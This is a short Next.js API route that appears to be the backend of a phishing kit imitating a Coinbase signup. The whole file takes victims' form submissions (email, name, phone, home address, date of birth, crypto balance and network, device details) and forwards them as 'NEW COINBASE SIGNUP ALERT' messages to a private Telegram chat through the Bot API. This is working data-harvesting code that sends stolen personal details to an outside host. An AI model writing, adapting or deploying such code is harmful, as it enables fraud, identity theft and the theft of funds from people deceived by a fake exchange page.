import { type NextRequest, NextResponse } from "next/server"

// Telegram Bot API configuration
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN
const TELEGRAM_USER_ID = process.env.TELEGRAM_USER_ID

export async function POST(request: NextRequest) {
  try {
    const formData = await request.json()

    // Validate Telegram configuration
    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_USER_ID) {
      console.error("Missing Telegram configuration in environment variables")
      return NextResponse.json(
        {
          success: false,
          message: "Telegram bot configuration missing",
        },
        { status: 500 },
      )
    }

    // Log the received data
    console.log("New Coinbase signup data received:", {
      timestamp: formData.timestamp,
      email: formData.email,
      fullName: formData.fullName,
      country: formData.country,
      phone: formData.phoneWithCode,
      cryptoNetwork: formData.cryptoNetwork,
      balance: formData.balance,
    })

    // Format message for Telegram
    const telegramMessage = `🚨 *NEW COINBASE SIGNUP ALERT* 🚨

📧 *Email:* \`${formData.email}\`
👤 *Name:* ${formData.fullName}
🌍 *Country:* ${formData.country}
📱 *Phone:* ${formData.phoneWithCode}
🏠 *Address:* ${formData.address}
🏙️ *City:* ${formData.city}
🗺️ *State:* ${formData.state}
🎂 *DOB:* ${formData.dateOfBirth}
💰 *Balance:* $${formData.balance || "0"}
🔗 *Network:* ${formData.cryptoNetwork}
🕐 *Time:* ${new Date(formData.timestamp).toLocaleString()}
🌐 *Timezone:* ${formData.timezone}
📱 *Device:* ${formData.userAgent.split(" ")[0]}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚡ *Coinbase Registration System* ⚡`

    // Send to Telegram Bot
    const telegramResponse = await sendTelegramMessage(telegramMessage)

    if (telegramResponse.success) {
      return NextResponse.json({
        success: true,
        message: "Form data successfully sent to Telegram bot",
        telegramResponse: telegramResponse,
        timestamp: new Date().toISOString(),
      })
    } else {
      throw new Error(telegramResponse.error || "Failed to send Telegram message")
    }
  } catch (error) {
    console.error("Error processing bot notifications:", error)
    return NextResponse.json(
      {
        success: false,
        message: "Failed to send notifications to Telegram bot",
        error: error instanceof Error ? error.message : "Unknown error",
      },
      { status: 500 },
    )
  }
}

// Send message to Telegram Bot
async function sendTelegramMessage(message: string) {
  try {
    const telegramApiUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`

    const response = await fetch(telegramApiUrl, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        chat_id: TELEGRAM_USER_ID,
        text: message,
        parse_mode: "Markdown",
        disable_web_page_preview: true,
      }),
    })

    const data = await response.json()

    if (response.ok && data.ok) {
      return {
        success: true,
        messageId: data.result.message_id,
        timestamp: new Date().toISOString(),
      }
    } else {
      return {
        success: false,
        error: data.description || "Unknown Telegram API error",
        errorCode: data.error_code,
      }
    }
  } catch (error) {
    return {
      success: false,
      error: error instanceof Error ? error.message : "Network error",
    }
  }
}

